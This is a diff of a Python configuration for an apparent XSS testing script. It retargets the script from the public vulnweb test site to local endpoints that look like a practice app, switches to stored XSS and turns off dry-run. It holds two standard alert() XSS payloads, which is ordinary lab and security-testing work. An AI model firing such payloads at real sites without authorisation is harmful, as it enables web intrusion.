@@ -20,19 +20,31 @@ from xss_logic import xss_attack
 # }
 
 target = {
-    "url": "http://testphp.vulnweb.com/search.php",
-    "param": "search"
+    # "url": "https://testphp.vulnweb.com/search.php",
+    # "param": "search"
+    # "url": "https://testphp.vulnweb.com/comment.php",
+    # "param": "comment"
+    
+    "url": "http://localhost:3000/rest/products/search",
+    "param": "q"
+    # "url": "http://localhost:3000/rest/user/login",
+    # "param": "email"
+    # "url": "http://localhost:3000/api/Feedbacks",
+    # "param": "comment"
 }
 
+
 xss_config = {
-    "xss_type": "reflected",
+    #"xss_type": "reflected",
+    "xss_type": "stored",
     "payloads": [
         "<script>alert(1)</script>",
         "<img src=x onerror=alert(1)>"
     ],
     "attempts": 3,
     "rate_limit": 1,
-    "dry_run": True   
+    "dry_run": False,
+    "crawl": False
 }
 
 #gets xss test result
